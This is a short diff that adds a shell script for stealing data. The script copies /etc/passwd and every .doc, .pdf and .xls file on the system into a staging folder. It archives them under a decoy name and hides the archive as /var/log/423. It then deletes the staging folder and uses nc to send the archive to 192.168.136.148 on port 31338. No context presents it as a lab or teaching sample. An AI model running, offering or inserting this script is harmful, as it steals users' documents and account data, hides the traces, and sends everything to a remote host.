@@ -1,0 +1,24 @@
+mkdir /z
+mkdir /z/pdf
+mkdir /z/excel
+
+cp /etc/passwd  /z/creds
+
+
+find / -name "*.doc" -exec cp {} /z/ \;
+find / -name "*.pdf" -exec cp {} /z/pdf/ \;
+find / -name "*.xls" -exec cp {} /z/excel/ \;
+
+
+tar -czvf /z/catLitter.tar.gz /z
+
+cp /z/catLitter.tar.gz /var/log/423
+
+rm -r /z/*
+rmdir /z
+
+
+
+nc -w 3 192.168.136.148 31338 < /var/log/423
+
+
